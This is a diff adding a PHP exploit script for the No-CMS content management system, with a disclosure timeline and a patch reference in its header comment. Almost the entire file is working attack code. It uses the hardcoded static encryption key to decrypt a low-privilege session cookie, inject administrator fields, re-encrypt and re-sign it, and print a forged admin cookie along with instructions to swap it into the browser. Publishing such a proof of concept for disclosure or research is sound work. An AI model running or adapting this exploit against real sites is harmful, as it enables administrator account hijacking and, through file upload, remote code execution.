@@ -1,0 +1,282 @@
+<?php
+/*
+* 
+* Static encryption_key of No-CMS lead to Session Array Injection in order to
+* hijack administrator account then you will be able for upload php files to
+* server via theme/module upload.
+* 
+* This exploit generates cookie for administrator access from non-privileges cookie.
+*  
+* Full analysis can be found following link.
+* http://www.mehmetince.net/codeigniter-based-no-cms-admin-account-hijacking-rce-via-static-encryption-key/
+* 
+* TIMELINE
+* 
+* Apr 21, 2014 at 20:17 PM = Vulnerability found.
+* Apr 22, 2014 at 1:27 AM = First contact with no-cms developers.
+* Apr 22, 2014 at 1:31 AM = Response from no-cms developer.
+* Apr 22, 2014 at 2:29AM = Vulnerability confirmed by developers.
+* Apr 22, 2014 at 04:37 = Vulnerability has been patch via following commit.
+* https://github.com/goFrendiAsgard/No-CMS/commit/39d6ed327330e94b7a76a04042665dd13f2162bd
+*/
+define('KEY', 'namidanoregret');
+define('KEYWORD', 'session_id');
+
+function log_message($type = 'debug', $str){
+    echo PHP_EOL."[".$type."] ".$str;
+}
+function show_error($str){
+    echo PHP_EOL."[error] ".$str.PHP_EOL;
+    exit(0);
+}
+function _print($str){
+    log_message("info", $str.PHP_EOL);
+}
+class CI_Encrypt {
+    public $encryption_key		= '';
+    protected $_hash_type		= 'sha1';
+    protected $_mcrypt_exists	= FALSE;
+    protected $_mcrypt_cipher;
+    protected $_mcrypt_mode;
+    public function __construct()
+    {
+        $this->_mcrypt_exists = function_exists('mcrypt_encrypt');
+        log_message('debug', 'Encrypt Class Initialized');
+    }
+    public function get_key($key = '')
+    {
+        return md5($this->encryption_key);
+    }
+    public function set_key($key = '')
+    {
+        $this->encryption_key = $key;
+        return $this;
+    }
+    public function encode_from_legacy($string, $legacy_mode = MCRYPT_MODE_ECB, $key = '')
+    {
+        if ($this->_mcrypt_exists === FALSE)
+        {
+            log_message('error', 'Encoding from legacy is available only when Mcrypt is in use.');
+            return FALSE;
+        }
+        elseif (preg_match('/[^a-zA-Z0-9\/\+=]/', $string))
+        {
+            return FALSE;
+        }
+        $current_mode = $this->_get_mode();
+        $this->set_mode($legacy_mode);
+
+        $key = $this->get_key($key);
+        $dec = base64_decode($string);
+        if (($dec = $this->mcrypt_decode($dec, $key)) === FALSE)
+        {
+            $this->set_mode($current_mode);
+            return FALSE;
+        }
+        $dec = $this->_xor_decode($dec, $key);
+        $this->set_mode($current_mode);
+        return base64_encode($this->mcrypt_encode($dec, $key));
+    }
+    public function _xor_encode($string, $key = '')
+    {
+        if($key === '')
+            $key = $this->get_key();
+        $rand = '';
+        do
+        {
+            $rand .= mt_rand();
+        }
+        while (strlen($rand) < 32);
+        $rand = $this->hash($rand);
+        $enc = '';
+        for ($i = 0, $ls = strlen($string), $lr = strlen($rand); $i < $ls; $i++)
+        {
+            $enc .= $rand[($i % $lr)].($rand[($i % $lr)] ^ $string[$i]);
+        }
+        return $this->_xor_merge($enc, $key);
+    }
+    public function _xor_decode($string, $key = '')
+    {
+        if($key === '')
+            $key = $this->get_key();
+        $string = $this->_xor_merge($string, $key);
+
+        $dec = '';
+        for ($i = 0, $l = strlen($string); $i < $l; $i++)
+        {
+            $dec .= ($string[$i++] ^ $string[$i]);
+        }
+        return $dec;
+    }
+    protected function _xor_merge($string, $key)
+    {
+        $hash = $this->hash($key);
+        $str = '';
+        for ($i = 0, $ls = strlen($string), $lh = strlen($hash); $i < $ls; $i++)
+        {
+            $str .= $string[$i] ^ $hash[($i % $lh)];
+        }
+        return $str;
+    }
+    public function mcrypt_encode($data, $key = '')
+    {
+        if($key === '')
+            $key = $this->get_key();
+        $init_size = mcrypt_get_iv_size($this->_get_cipher(), $this->_get_mode());
+        $init_vect = mcrypt_create_iv($init_size, MCRYPT_RAND);
+        return $this->_add_cipher_noise($init_vect.mcrypt_encrypt($this->_get_cipher(), $key, $data, $this->_get_mode(), $init_vect), $key);
+    }
+    public function mcrypt_decode($data, $key = '')
+    {
+        if($key === '')
+            $key = $this->get_key();
+        $data = $this->_remove_cipher_noise($data, $key);
+        $init_size = mcrypt_get_iv_size($this->_get_cipher(), $this->_get_mode());
+
+        if ($init_size > strlen($data))
+        {
+            return FALSE;
+        }
+
+        $init_vect = substr($data, 0, $init_size);
+        $data = substr($data, $init_size);
+        return rtrim(mcrypt_decrypt($this->_get_cipher(), $key, $data, $this->_get_mode(), $init_vect), "\0");
+    }
+    protected function _add_cipher_noise($data, $key)
+    {
+        $key = $this->hash($key);
+        $str = '';
+        for ($i = 0, $j = 0, $ld = strlen($data), $lk = strlen($key); $i < $ld; ++$i, ++$j)
+        {
+            if ($j >= $lk)
+            {
+                $j = 0;
+            }
+            $str .= chr((ord($data[$i]) + ord($key[$j])) % 256);
+        }
+        return $str;
+    }
+    protected function _remove_cipher_noise($data, $key)
+    {
+        $key = $this->hash($key);
+        $str = '';
+        for ($i = 0, $j = 0, $ld = strlen($data), $lk = strlen($key); $i < $ld; ++$i, ++$j)
+        {
+            if ($j >= $lk)
+            {
+                $j = 0;
+            }
+            $temp = ord($data[$i]) - ord($key[$j]);
+            if ($temp < 0)
+            {
+                $temp += 256;
+            }
+            $str .= chr($temp);
+        }
+        return $str;
+    }
+    public function set_cipher($cipher)
+    {
+        $this->_mcrypt_cipher = $cipher;
+        return $this;
+    }
+    public function set_mode($mode)
+    {
+        $this->_mcrypt_mode = $mode;
+        return $this;
+    }
+    protected function _get_cipher()
+    {
+        if ($this->_mcrypt_cipher === NULL)
+        {
+            return $this->_mcrypt_cipher = MCRYPT_RIJNDAEL_256;
+        }
+        return $this->_mcrypt_cipher;
+    }
+    protected function _get_mode()
+    {
+        if ($this->_mcrypt_mode === NULL)
+        {
+            return $this->_mcrypt_mode = MCRYPT_MODE_CBC;
+        }
+        return $this->_mcrypt_mode;
+    }
+    public function set_hash($type = 'sha1')
+    {
+        $this->_hash_type = in_array($type, hash_algos()) ? $type : 'sha1';
+    }
+    public function hash($str)
+    {
+        return hash($this->_hash_type, $str);
+    }
+
+}
+
+$encryption = new CI_Encrypt();
+$encryption->set_key(KEY);
+
+// WRITE YOUR OWN COOKIE HERE! 
+$cookie = rawurldecode("DZyb3lI68zh+RBNg8C4M03TEJhMR4BBMzNWA1YUampWQ6UKaiUhG48rwkdfIs9DJYNQc8pZDniflInnUrQz1FbRxueQ3NLCahBBmrTuw8Ib7OL7ycm/IbuR81WEVrWpYOnQ4Z57/w21OCyVw42TjSkXkfWfN67veJr5630eTBA03vRbvLunZ9RLEuElqNrJu/H63yibCv8fyRWNnKs56i5OuU6Dso11O49k4fhxd008WTvsGliLxiErCkWwYfGfcjUA3V2Mh9mkrLk0YEKIbt3hbNXhAnGhIVIVJURhnmibqEFUacB1gP1GnbP2fQy3NpJt317n/3/sH+jH4lM+53IY1HOJh7n/J6RU9jqMr1hdeslDxFaV7SCuB4vPuO7SScec8063aae4808b195d818d86fda1d280ebb06bd");
+
+$len = strlen($cookie) - 40;
+
+if ($len < 0)
+{
+    show_error('The session cookie was not signed.');
+}
+// Check cookie authentication
+$hmac	 = substr($cookie, $len);
+$session = substr($cookie, 0, $len);
+
+if ($hmac !== hash_hmac('sha1', $session, KEY))
+{
+    show_error('The session cookie data did not match what was expected.');
+}
+
+// Detect target encryption method and Decrypt session
+$_mcrypt = $encryption->mcrypt_decode(base64_decode($session));
+$_xor = $encryption->_xor_decode(base64_decode($session));
+$method = '';
+$plain = '';
+
+if (strpos($_mcrypt, KEYWORD) !== false) {
+    _print("Encryption method is mcrypt!");
+    $method = 'm';
+    $plain = $_mcrypt;
+} else if (strpos($_xor, KEYWORD) !== false) {
+    _print("Encryption method is xor!");
+    $method = 'x';
+    $plain = $_xor;
+} else {
+    show_error("something went wrong.");
+}
+
+// Unserialize session string in order to create session array.
+$session = unserialize($plain);
+_print("Current Session Array :");
+print_r($session).PHP_EOL;
+
+// Add extra fields into it
+$session['cms_user_name'] = 'admin';
+$session['cms_user_id'] = 1;
+
+// Print out payload string.
+_print("Payload appended Session Array :");
+print_r($session).PHP_EOL;
+
+// Serialize it
+$session = serialize($session);
+
+
+// Encrypt it with same key.
+if ($method === 'm')
+    $payload = base64_encode($encryption->mcrypt_encode($session));
+if ($method === 'x')
+    $payload = base64_encode($encryption->_xor_encode($session));
+
+// Calculation of hmac to add it end of the encrypted session string.
+$payload .= hash_hmac('sha1', $payload, KEY);
+
+_print("New Cookie");
+_print($payload);
+_print("Use Tamper Data and change cookie then push F5!");
